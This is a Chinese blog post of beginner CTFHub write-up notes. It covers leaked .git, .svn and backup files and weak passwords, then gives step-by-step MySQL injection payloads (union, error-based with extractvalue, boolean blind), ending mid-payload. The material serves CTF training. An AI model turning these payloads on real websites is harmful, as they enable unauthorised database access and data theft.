<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="简单记录一些笔记"><title>CTFHub入门笔记 | Disda</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 6.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CTFHub入门笔记</h1><a id="logo" href="/.">Disda</a><p class="description">Disda’s Blog</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CTFHub入门笔记</h1><div class="post-meta">2023-03-29<span> | </span><span class="category"><a href="/categories/ctf/">ctf</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="post-content"><p>收集和记录一下CTF入门的write up</p>
<span id="more"></span>

<!-- toc -->

<ul>
<li><a href="#%E7%BD%91%E7%AB%99">网站</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
<li><a href="#web">Web</a><ul>
<li><a href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD">前置技能</a><ul>
<li><a href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">请求方式</a></li>
<li><a href="#302%E8%B7%B3%E8%BD%AC">302跳转</a></li>
<li><a href="#cookie">Cookie</a></li>
<li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81">基础认证</a></li>
<li><a href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81">响应包源代码</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a><ul>
<li><a href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">目录遍历</a></li>
<li><a href="#phpinfo">phpinfo</a></li>
<li><a href="#hg%E6%B3%84%E9%9C%B2">hg泄露</a></li>
<li><a href="#svn%E6%B3%84%E9%9C%B2">SVN泄露</a></li>
<li><a href="#git%E6%B3%84%E9%9C%B2">Git泄露</a><ul>
<li><a href="#log">log</a></li>
<li><a href="#stash">Stash</a></li>
<li><a href="#index">index</a></li>
</ul>
</li>
<li><a href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">备份文件下载</a><ul>
<li><a href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81">网站源码</a></li>
<li><a href="#bak%E6%96%87%E4%BB%B6">bak文件</a></li>
<li><a href="#vim%E7%BC%93%E5%AD%98">vim缓存</a></li>
<li><a href="#ds_store">DS_Store</a></li>
</ul>
</li>
<li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">字符型</a></li>
<li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a></li>
<li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">布尔注入</a></li>
<li><a href="#mysql%E7%BB%93%E6%9E%84">MySQL结构</a></li>
<li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a></li>
<li><a href="#cookie%E6%B3%A8%E5%85%A5">cookie注入</a></li>
<li><a href="#ua%E6%B3%A8%E5%85%A5">UA注入</a></li>
<li><a href="#referer%E6%B3%A8%E5%85%A5">Referer注入</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC">过滤空格</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a><ul>
<li><a href="#%E6%97%A0%E9%AA%8C%E8%AF%81">无验证</a></li>
<li><a href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81">前端验证</a></li>
<li><a href="#htaccess">.htaccess</a></li>
<li><a href="#mime">MIME</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5">文件头检查</a></li>
<li><a href="#00%E6%88%AA%E6%96%AD">00截断</a></li>
<li><a href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80">双写后缀</a></li>
</ul>
</li>
<li><a href="#rce">RCE</a><ul>
<li><a href="#eval%E6%89%A7%E8%A1%8C">eval执行</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
<li><a href="#phpinput">php:&#x2F;&#x2F;input</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81">读取源代码</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB">远程包含</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">命令注入</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4cat">过滤cat</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-1">过滤空格</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E5%89%B2%E7%AC%A6">过滤目录分割符</a></li>
<li><a href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6">过滤运算符</a></li>
<li><a href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0">综合练习</a></li>
</ul>
</li>
<li><a href="#ssrf">SSRF</a><ul>
<li><a href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE">内网访问</a></li>
<li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">伪协议读取文件</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a></li>
<li><a href="#post%E8%AF%B7%E6%B1%82">POST请求</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6">上传文件</a></li>
<li><a href="#redis%E5%8D%8F%E8%AE%AE">Redis协议</a></li>
<li><a href="#url-bypass">URL Bypass</a></li>
<li><a href="#%E6%95%B0%E5%AD%97ip-bypass">数字IP Bypass</a></li>
<li><a href="#302%E8%B7%B3%E8%BD%AC-1">302跳转</a></li>
<li><a href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass">DNS重绑定 Bypass</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#reverse">Reverse</a></li>
<li><a href="#crypto">Crypto</a></li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">流量分析</a><ul>
<li><a href="#mysql%E6%B5%81%E9%87%8F">Mysql流量</a></li>
<li><a href="#redis%E6%B5%81%E9%87%8F">Redis流量</a></li>
<li><a href="#mongodb">MongoDB</a></li>
<li><a href="#icmp-data">ICMP Data</a></li>
<li><a href="#icmp-length">ICMP Length</a></li>
<li><a href="#icmp-lengthbin">ICMP LengthBin</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h1><span id="网站">网站</span></h1><ul>
<li>刷题<ul>
<li><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHUB</a> 对新人极其友好，可以快速入门CTF</li>
<li><a target="_blank" rel="noopener" href="https://buuoj.cn/login?next=/challenges?">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li>
<li><a target="_blank" rel="noopener" href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></li>
</ul>
</li>
<li>搜索引擎<ul>
<li><a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></li>
<li><a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li>
</ul>
</li>
</ul>
<h1><span id="工具">工具</span></h1><ul>
<li><p>BurpSuite</p>
<blockquote>
<p>​	Burp Suite是一个功能强大的集成渗透测试工具，旨在帮助安全测试人员执行各种 Web 应用程序安全测试。它提供了多个模块，包括代理、扫描器、爬虫、反射器、拦截器、重放器等功能，可协助测试人员发现应用程序中的漏洞，如SQL注入、跨站点脚本（XSS）、身份验证和会话问题、CSRF、文件包含漏洞等。</p>
</blockquote>
</li>
<li><p>WiresShark</p>
<blockquote>
<p>Wireshark是一款网络协议分析工具，可以帮助用户捕获和分析网络数据包。它能够实时抓取和展示网络上所有传输的数据，并提供多种过滤机制和统计图表，能够深入了解网络通信的细节，发现网络通信中可能存在的问题。</p>
</blockquote>
</li>
<li><p>fscan</p>
<blockquote>
<p>fscan是一款基于Python的网络渗透测试工具，它可以用于目标发现、端口扫描、漏洞检测等方面。fscan能够快速扫描大量IP地址和端口，并提供了多种扫描方式和过滤规则，例如TCP和UDP端口扫描、服务识别、OS指纹识别等。</p>
</blockquote>
</li>
<li><p>GitHack</p>
<blockquote>
<p>GitHack指的是一种基于Git版本控制系统的攻击技术。攻击者可以使用GitHack来获取敏感信息或执行未经授权的操作。攻击者通常会在Git上查找敏感信息，例如密码或私钥，并利用这些信息进一步入侵目标系统。</p>
</blockquote>
</li>
<li><p>dvcs-ripper</p>
<blockquote>
<p>可以支持svn、hg等文件下载</p>
</blockquote>
</li>
<li><p>PostMan</p>
<blockquote>
<p>Postman是一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/1917757?fromModule=lemma_inlink">接口测试</a>工具,在做接口测试的时候,Postman相当于一个客户端,它可以模拟用户发起的各类<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/HTTP%E8%AF%B7%E6%B1%82/10882159?fromModule=lemma_inlink">HTTP请求</a>,将请求<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81/22124759?fromModule=lemma_inlink">数据发送</a>至<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E7%AB%AF/6492316?fromModule=lemma_inlink">服务端</a>,获取对应的响应结果, 从而验证响应中的结果数据是否和预期值相匹配;并确保开发人员能够及时处理接口中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink">bug</a>,进而保证产品上线之后的稳定性和安全性</p>
</blockquote>
</li>
</ul>
<h1><span id="web">Web</span></h1><h3><span id="前置技能">前置技能</span></h3><h4><span id="请求方式">请求方式</span></h4><ul>
<li>思路：使用PostMan，修改请求方式为CTFHUB</li>
</ul>
<h4><span id="302跳转">302跳转</span></h4><p>使用浏览器访问index.php时，发现F12中network有302</p>
<ul>
<li>思路：使用curl访问index.php即可，因为curl不支持302跳转</li>
</ul>
<h4><span id="cookie">Cookie</span></h4><p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp">参考</a>，使用<code>burpsuite</code>的<code>repeater</code>功能</p>
<h4><span id="基础认证">基础认证</span></h4><p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj">参考</a>，使用<code>burpsuite</code>的<code>Intruder</code>功能</p>
<h4><span id="响应包源代码">响应包源代码</span></h4><p>使用F12直接在前端源代码里面查看</p>
<h3><span id="信息泄露">信息泄露</span></h3><h4><span id="目录遍历">目录遍历</span></h4><p>由于配置错误导致网站的目录可被遍历。</p>
<ul>
<li>思路：我们遍历网站即可找到结果</li>
</ul>
<h4><span id="phpinfo">phpinfo</span></h4><p>phpinfo()是php中查看相关信息的函数，当在页面中执行<code>phpinfo()</code>函数时，php会将自身的所有信息全部打印出来。在<code>phpinfo</code>中会泄露很多服务端的一些信息</p>
<ul>
<li>思路：flag暴露在phpinfo中</li>
</ul>
<h4><span id="hg泄露">hg泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.hg文件夹，使用dvcs-ripper下载目录，但是工具没有将所有文件下下来，使用<code>tree</code>命令来查看目录，分析发现txt文件中有<code>add flag</code>，使用<code>grep -a -r flag</code>查看flag存在的文件名，通过curl来查看文件。</li>
</ul>
<h4><span id="svn泄露">SVN泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.svn文件夹，使用dvcs-ripper下载目录，从 wc.db 中找到 flag 的文件的文件名, 尝试访问结果发现被删除了。查看<code>.svn/pristine/</code>中的文件，找到flag</li>
</ul>
<h4><span id="git泄露">Git泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.git文件夹，使用githack工具将网站里的.git文件夹下载到本地</li>
</ul>
<h5><span id="log">log</span></h5><p>网站下可能有.git文件</p>
<ul>
<li>思路：我们通过<code>git log</code>查看提交日志，然后用过<code>git diff</code>来对比版本区别找到flag</li>
</ul>
<h5><span id="stash">Stash</span></h5><p>git可能有的文件放到stash暂存</p>
<ul>
<li>思路：通过<code>git stash list</code>查看，执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</li>
</ul>
<h5><span id="index">index</span></h5><p>使用<code>git ls-file --stage</code>查看index file文件，使用<code>git log</code>命令查看历史记录，通过<code>git diff</code>对比提交版本。</p>
<h4><span id="备份文件下载">备份文件下载</span></h4><h5><span id="网站源码">网站源码</span></h5><ul>
<li>思路：网站源码可能放在目录里面，打开即可获取flag</li>
</ul>
<h5><span id="bak文件">bak文件</span></h5><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak</p>
<ul>
<li>思路：直接使用curl + url 即可访问</li>
</ul>
<h5><span id="vim缓存">vim缓存</span></h5><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容  </p>
<p>以index.php为例：第一次产生的交换文件名为<code>.index.php.swp</code>，再次意外退出后会产生名为 <code>.index.php.swo</code>的交换文件，第三次产生的交换文件则为 <code>.index.php.swn</code></p>
<ul>
<li>思路：使用curl访问，或者使用wget下载到本地再查看</li>
</ul>
<h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plaintext"><figcaption><span>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过```.DS_Store```可以知道这个目录里面所有文件的清单。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 思路：使用curl命令访问```.DS_Store``` 文件即可</span><br><span class="line"></span><br><span class="line">### 密码口令</span><br><span class="line"></span><br><span class="line">#### 弱口令</span><br><span class="line"></span><br><span class="line">- 思路：看到管理系统默认账号为admin，密码先尝试用弱口令密码本攻击，发现无效</span><br><span class="line"></span><br><span class="line">#### 默认口令</span><br><span class="line"></span><br><span class="line">- 思路：靠社会工程的检索能力</span><br><span class="line"></span><br><span class="line">### SQL注入</span><br><span class="line"></span><br><span class="line">#### 整数型</span><br><span class="line"></span><br><span class="line">检查是否存在注入</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">xx = ? and 1=1 # 返回正确</span><br><span class="line">xx = ? and 1=2 # 返回错误</span><br></pre></td></tr></table></figure>

<p>猜字段数（x为数字） 得出字段数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>

<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure>

<p>其中… 的数量为<code>order by x</code>中的x</p>
<h4><span id="字符型">字符型</span></h4><p>字符型注入要考虑到  引号闭合  和  注释 </p>
<p>判断注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 # 返回正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 返回错误</span><br></pre></td></tr></table></figure>

<p>猜字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 2 # 返回正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # 返回错误</span><br></pre></td></tr></table></figure>

<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,database()</span></span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>爆字段内容（flag）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(flag) from sqli.flag</span></span><br></pre></td></tr></table></figure>

<h4><span id="报错注入">报错注入</span></h4><figure class="highlight plaintext"><figcaption><span>:对[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```extractvalue(目标xml文档，xml路径)```</span><br><span class="line"></span><br><span class="line">&gt; 第一个参数 : 第一个参数可以传入目标xml文档</span><br><span class="line">&gt;</span><br><span class="line">&gt; 第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 可以用 0x5c  (‘\)，还可以使用0x7e (~)，使得sql非法</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p><strong>mid函数</strong></p>
<blockquote>
<p>MID()函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要提取字符的字段。</td>
</tr>
<tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"># 拼接得到flag</span><br></pre></td></tr></table></figure>

<h4><span id="布尔注入">布尔注入</span></h4><p>只会返回正确或者错误，因此我们需要构造<code>if</code>语句进行注入，手动过程供参考，还是用sqlmap靠谱。</p>
<ul>
<li>先猜测数据库长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">&gt;</span><span class="number">5</span> # 结果是error</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">=</span><span class="number">4</span> # 结果是success</span><br></pre></td></tr></table></figure>

<ul>
<li>猜测数据库名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span> # 可以二分法来确认每个字母 </span><br></pre></td></tr></table></figure>

<ul>
<li>得到数据库表中数量</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>得到表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第一个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第二个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第三个字母猜解出来)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># 最后得到表名为news</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第一个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第二个字母猜解出来)</span><br><span 